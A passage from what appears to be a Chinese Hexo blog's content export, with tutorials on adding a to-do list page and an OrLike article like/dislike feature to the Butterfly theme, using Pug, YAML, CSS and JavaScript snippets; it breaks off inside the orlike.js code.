class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入CSS与JS</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=&quot;//cdn.bootcss.com/pace/1.0.2/pace.min.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/10/p9DkhBF.png" alt=""></p><p><code>hexo三连</code>查看效果即可</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>制作待做清单页面</title>
      <link href="/post/c9b8a393.html"/>
      <url>/post/c9b8a393.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://www.qcqx.cn/article/9875347c.html">博客添加待办清单页 | 轻笑Chuckle (qcqx.cn)</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/09/p9BcUsA.png" alt=""></p>              </div>            </details><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>新建Blog\themes\butterfly\layout\includes\page\todolist.pug并添加下列代码</p><p><strong>注意：请将下列代码第二行中的/img/todo.webp替换为你想要展现的图片路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#todolist-box</span><br><span class="line">    .page-top-card(style=&#x27;background-image: url(/img/todo.png);&#x27;)</span><br><span class="line">        .content-item-tips 想做清单</span><br><span class="line">        span.content-item-title ToDoList</span><br><span class="line">        .content-bottom</span><br><span class="line">            .tips 要做的事还有很多，想做的事源源不断</span><br><span class="line">    #todolist-main</span><br><span class="line">        #todolist-left</span><br><span class="line">            each i in site.data.todolist</span><br><span class="line">                if i.seat == &#x27;left&#x27;</span><br><span class="line">                    .todolist-item</span><br><span class="line">                        h3.todolist-title=i.class_name</span><br><span class="line">                        ul.todolist-ul</span><br><span class="line">                            each item in i.todo_list</span><br><span class="line">                                li.todolist-li</span><br><span class="line">                                    if item.completed</span><br><span class="line">                                        i.fa-regular.fa-circle-check</span><br><span class="line">                                    else </span><br><span class="line">                                        i.fa-regular.fa-circle</span><br><span class="line">                                    span=item.content</span><br><span class="line">        #todolist-right</span><br><span class="line">            each i in site.data.todolist</span><br><span class="line">                if i.seat == &#x27;right&#x27;</span><br><span class="line">                    .todolist-item</span><br><span class="line">                        h3.todolist-title=i.class_name</span><br><span class="line">                        ul.todolist-ul</span><br><span class="line">                            each item in i.todo_list</span><br><span class="line">                                li.todolist-li</span><br><span class="line">                                    if item.completed</span><br><span class="line">                                        i.fa-regular.fa-circle-check</span><br><span class="line">                                    else </span><br><span class="line">                                        i.fa-regular.fa-circle</span><br><span class="line">                                    span=item.content</span><br></pre></td></tr></table></figure><p>修改Blog\themes\butterfly\layout\page.pug，将下列代码添加到如图所示的位置，注意缩进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">when &#x27;todolist&#x27;</span><br><span class="line">include includes/page/todolist.pug</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/09/p9BgVTP.png" alt=""></p><p>新建Blog\source \ _data\todolist.yml，清单内容请自行修改，completed为true代表已完成</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">想做的项目</span></span><br><span class="line">  <span class="attr">seat:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">todo_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">个人主页</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">公众号</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">想看的书</span></span><br><span class="line">  <span class="attr">seat:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">todo_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">《毛泽东选集》</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">《86不存在的战区》</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">想买的东西</span></span><br><span class="line">  <span class="attr">seat:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">todo_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">小米平板5pro</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">致态固态硬盘</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">想学的技术</span></span><br><span class="line">  <span class="attr">seat:</span> <span class="string">right</span></span><br><span class="line">  <span class="attr">todo_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">Vue2/Vue3</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">Electron</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">想去的地方</span></span><br><span class="line">  <span class="attr">seat:</span> <span class="string">right</span></span><br><span class="line">  <span class="attr">todo_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">桂林</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">杭州</span></span><br><span class="line">      <span class="attr">completed:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>打开Blog\source\css\custom.css并在末尾添加下列代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#todolist-box</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todolist-main</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">16px</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todolist-main</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">list-style</span>:none;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">17px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todolist-main</span> <span class="selector-tag">ul</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todolist-left</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todolist-right</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.todolist-item</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fae4df</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">1rem</span> <span class="number">1.2rem</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dashed <span class="number">#f7a796</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span></span><br><span class="line"><span class="selector-class">.todolist-item</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#242424</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dashed <span class="number">#51908b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.todolist-li</span> <span class="selector-tag">i</span>&#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h3</span><span class="selector-class">.todolist-title</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span><span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="built_in">var</span>(--todo-border);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.todolist-li</span>&#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="built_in">var</span>(--todo-border);</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.todolist-li</span> <span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">700px</span>)&#123;</span><br><span class="line">    <span class="selector-id">#todolist-left</span>,<span class="selector-id">#todolist-right</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-class">.page-top-card</span>&#123;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-position</span>: center;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">20.5rem</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">2.7rem</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.page-top-card</span> <span class="selector-tag">span</span><span class="selector-class">.content-item-title</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2.3em</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.2</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: STZhongsong,<span class="string">&#x27;Microsoft YaHei&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.page-top-card</span> <span class="selector-class">.content-bottom</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">5.4rem</span>);</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> <span class="selector-class">.page-top-card</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: .<span class="number">92</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建页面：在Blog根目录打开Git Bash，输入下列代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;ToDoList&quot;</span></span><br></pre></td></tr></table></figure><p>修改front-matter</p><p><img src="https://s1.ax1x.com/2023/05/09/p9Bgbh8.png" alt=""></p><p>添加到导航菜单</p><p>打开主题配置文件_config.butterfly.yml，图标我用的是标签的图标，因为我的标签页没有启用，你可以更换成自己想要的</p><p><img src="https://s1.ax1x.com/2023/05/09/p9BRYzF.png" alt=""></p><h2 id="hexo三连"><a href="#hexo三连" class="headerlink" title="hexo三连"></a>hexo三连</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现文章点赞</title>
      <link href="/post/8b08ba9.html"/>
      <url>/post/8b08ba9.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://www.qcqx.cn/article/5de26c08.html">网站添加点赞、踩功能 | 轻笑Chuckle (qcqx.cn)</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/09/p9BdV81.png" alt=""></p>              </div>            </details><h2 id="部署OrLike"><a href="#部署OrLike" class="headerlink" title="部署OrLike"></a>部署OrLike</h2><p>注册登录<a href="https://leancloud.app/">LeanCloud</a>并创建应用-&gt;回到首页点击应用设置</p><p><img src="https://s1.ax1x.com/2023/05/09/p9BdbM6.png" alt=""></p><p>点击应用凭证并保存<code>AppID</code>和<code>AppKey</code>的值</p><p><img src="https://s1.ax1x.com/2023/05/09/p9Bd7xx.png" alt=""></p><p>点击数据存储-&gt;结构化数据-&gt;创建Class，名称设置为<code>OrLike</code>，不用改其余配置</p><p><img src="https://s1.ax1x.com/2023/05/09/p9BwGo4.png" alt=""></p><h4 id="点击一键部署-，将应用部署到Vercel，未注册Vercel请参考添加Twikoo实现博客在线评论"><a href="#点击一键部署-，将应用部署到Vercel，未注册Vercel请参考添加Twikoo实现博客在线评论" class="headerlink" title="点击一键部署)，将应用部署到Vercel，未注册Vercel请参考添加Twikoo实现博客在线评论"></a>点击<a href="[New Project – Vercel](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fcaibingcheng%2Forlike-vercel">一键部署</a>)，将应用部署到Vercel，未注册Vercel请参考<a href="https://www.dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a></h4><h4 id="由于Vercel域名被墙，需要修改Vercel域名，请参考添加Twikoo实现博客在线评论"><a href="#由于Vercel域名被墙，需要修改Vercel域名，请参考添加Twikoo实现博客在线评论" class="headerlink" title="由于Vercel域名被墙，需要修改Vercel域名，请参考添加Twikoo实现博客在线评论"></a>由于Vercel域名被墙，需要修改Vercel域名，请参考<a href="https://www.dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a></h4><h3 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h3><p><em>今天完全搞忘了这一步导致云函数一直报错500，蠢哭了~_~</em></p><p>打开刚刚部署的项目点击settings</p><p><img src="https://s1.ax1x.com/2023/05/09/p9B0aNQ.png" alt=""></p><p>点击<code>Environment Variables</code>并填入<code>Key</code>和<code>Value</code>，这里注意：<code>Key</code>填”APPID”和”APPKEY”</p><p><img src="https://s1.ax1x.com/2023/05/09/p9B011I.png" alt=""></p><h2 id="前端部署"><a href="#前端部署" class="headerlink" title="前端部署"></a>前端部署</h2><p>以<strong>butterfly</strong>主题框架为例：</p><p>修改<code>themes\butterfly\layout\includes\post\reward.pug</code>，在末尾添加以下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#orlike-box.<span class="property">orlike</span>-box</span><br><span class="line">  script.</span><br><span class="line">    (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">loadOrLike</span> () &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">OrLike</span>(&#123;</span><br><span class="line">          <span class="attr">serverUrl</span>: <span class="string">&quot;你的api&quot;</span>,</span><br><span class="line">          <span class="attr">el</span>: <span class="string">&quot;.orlike-box&quot;</span>,</span><br><span class="line">          <span class="attr">days</span>: <span class="number">30</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">pjax</span> ? <span class="title function_">loadOrLike</span>() : <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, loadOrLike)</span><br><span class="line">    &#125;)()</span><br></pre></td></tr></table></figure><p>修改<code>themes\butterfly\layout\includes\header\post-info.pug</code>，在末尾添加以下代码，注意缩进在<code>.meta-firstline</code>内，与上方if保持一致即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">span.post-meta-orlike</span><br><span class="line">    i.iconfont.icon-aixin.fa-fw.post-meta-icon</span><br><span class="line">    span.post-meta-label= &#x27;点赞数:&#x27;</span><br><span class="line">    a(href=url_for(page.path) + &#x27;#orlike-box&#x27;)</span><br><span class="line">        span.orlike-count</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/09/p9B6PhD.png" alt=""></p><p>新建<code>Blog\source\js\orlike.js</code>，路径中缺少的文件夹或文件直接创建即可，添加下列代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> version = <span class="string">&quot;V0.1.33&quot;</span>; <span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">cname, cvalue, exdays</span>) &#123; <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(); d.<span class="title function_">setTime</span>(d.<span class="title function_">getTime</span>() + (exdays * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>)); <span class="keyword">var</span> expires = <span class="string">&quot;expires=&quot;</span> + d.<span class="title function_">toGMTString</span>(); <span class="variable language_">document</span>.<span class="property">cookie</span> = cname + <span class="string">&quot;=&quot;</span> + cvalue + <span class="string">&quot;; &quot;</span> + expires; &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">cname</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>; <span class="keyword">var</span> ca = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>); <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.<span class="property">length</span>; i++) &#123; <span class="keyword">var</span> c = ca[i].<span class="title function_">trim</span>(); <span class="keyword">if</span> (c.<span class="title function_">indexOf</span>(name) == <span class="number">0</span>) &#123; <span class="keyword">return</span> c.<span class="title function_">substring</span>(name.<span class="property">length</span>, c.<span class="property">length</span>); &#125; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createLink</span>(<span class="params">url</span>) &#123; <span class="keyword">let</span> link = $(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>)); link.<span class="title function_">attr</span>(<span class="string">&#x27;href&#x27;</span>, url); link.<span class="title function_">attr</span>(<span class="string">&#x27;rel&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>); link.<span class="title function_">attr</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>); $(<span class="string">&#x27;link&#x27;</span>).<span class="title function_">last</span>().<span class="title function_">after</span>(link); &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OrLike</span>(<span class="params">&#123; serverUrl = <span class="string">&quot;&quot;</span>, el = <span class="string">&quot;&quot;</span>, days = <span class="number">30</span>, style = <span class="string">&quot;&quot;</span>, ifont = <span class="string">&quot;&quot;</span>, icon = &#123; like: <span class="string">&quot;fa fa-thumbs-up&quot;</span>, dislike: <span class="string">&quot;fa fa-thumbs-down&quot;</span> &#125;, &#125; = &#123;&#125;</span>) &#123; <span class="variable language_">this</span>.<span class="property">serverUrl</span> = serverUrl; <span class="variable language_">this</span>.<span class="property">el</span> = el; <span class="variable language_">this</span>.<span class="property">style</span> = style; <span class="variable language_">this</span>.<span class="property">ifont</span> = ifont; <span class="variable language_">this</span>.<span class="property">days</span> = days; <span class="variable language_">this</span>.<span class="property">icon</span> = icon; <span class="variable language_">this</span>.<span class="property">ckid</span> = <span class="string">&quot;&quot;</span>; <span class="variable language_">this</span>.<span class="title function_">prepare</span>(); <span class="variable language_">this</span>.<span class="title function_">init</span>(); &#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">prepare</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="variable language_">this</span>.<span class="property">el</span>).<span class="title function_">addClass</span>(<span class="string">&quot;orlike-loading&quot;</span>); <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">style</span> != <span class="string">&quot;&quot;</span>) &#123; <span class="title function_">createLink</span>(<span class="variable language_">this</span>.<span class="property">style</span>); &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">ifont</span> != <span class="string">&quot;&quot;</span>) &#123; <span class="title function_">createLink</span>(<span class="variable language_">this</span>.<span class="property">ifont</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">OrLike</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    server_url = <span class="variable language_">this</span>.<span class="property">serverUrl</span>; obj = <span class="variable language_">this</span>; $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="attr">url</span>: server_url + <span class="string">&#x27;/tmp&#x27;</span>, <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>, <span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>, <span class="attr">jsonpCallback</span>: <span class="string">&quot;success&quot;</span>, <span class="attr">xhrFields</span>: &#123; <span class="attr">withCredentials</span>: <span class="literal">true</span> &#125;, <span class="attr">async</span>: <span class="literal">true</span>, <span class="attr">crossDomain</span>: <span class="literal">true</span>, <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> template = $(data.<span class="property">template</span>); <span class="keyword">let</span> icon_like = template.<span class="title function_">siblings</span>(<span class="string">&quot;a.likeit.orlike&quot;</span>).<span class="title function_">children</span>(<span class="string">&quot;i&quot;</span>); <span class="keyword">let</span> icon_dislike = template.<span class="title function_">siblings</span>(<span class="string">&quot;a.dislikeit.orlike&quot;</span>).<span class="title function_">children</span>(<span class="string">&quot;i&quot;</span>); icon_like.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, obj.<span class="property">icon</span>.<span class="property">like</span>); icon_dislike.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, obj.<span class="property">icon</span>.<span class="property">dislike</span>); <span class="keyword">if</span> (obj.<span class="property">icon</span>.<span class="property">like</span> == <span class="literal">false</span>)</span><br><span class="line">                icon_like.<span class="title function_">remove</span>(); <span class="keyword">if</span> (obj.<span class="property">icon</span>.<span class="property">dislike</span> == <span class="literal">false</span>)</span><br><span class="line">                icon_dislike.<span 